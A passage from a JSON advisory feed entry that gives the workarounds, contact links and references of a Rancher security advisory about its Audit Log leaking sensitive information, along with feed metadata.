id=\"workarounds\">Workarounds</h3>\n<p>If <code>AUDIT_LEVEL</code> <code>1 or above</code> is required and you cannot update to a patched Rancher version, ensure that the log is handled appropriately and it is not shared with other users or shipped into a log ingestion solution without the appropriate RBAC enforcement. Otherwise, disabling the Audit feature or decreasing it to the audit level <code>0</code>, mitigates the issue.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Reach out to the <a href=\"https://github.com/rancher/rancher/security/policy\">SUSE Rancher Security team</a> for security related inquiries.</li>\n<li>Open an issue in the <a href=\"https://github.com/rancher/rancher/issues/new/choose\">Rancher</a> repository.</li>\n<li>Verify with our <a href=\"https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/\">support matrix</a> and <a href=\"https://www.suse.com/lifecycle/\">product support lifecycle</a>.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/rancher/rancher/security/advisories/GHSA-xfj7-qf8w-2gcr\">https://github.com/rancher/rancher/security/advisories/GHSA-xfj7-qf8w-2gcr</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xfj7-qf8w-2gcr\">https://github.com/advisories/GHSA-xfj7-qf8w-2gcr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xfj7-qf8w-2gcr",
            "title": "[github.com/rancher/rancher] Rancher 'Audit Log' leaks sensitive information",
            "date_modified": "2024-02-08T18:44:26.000Z",
            "date_published": "2024-02-08T18:44:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xfj7-qf8w-2gcr"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}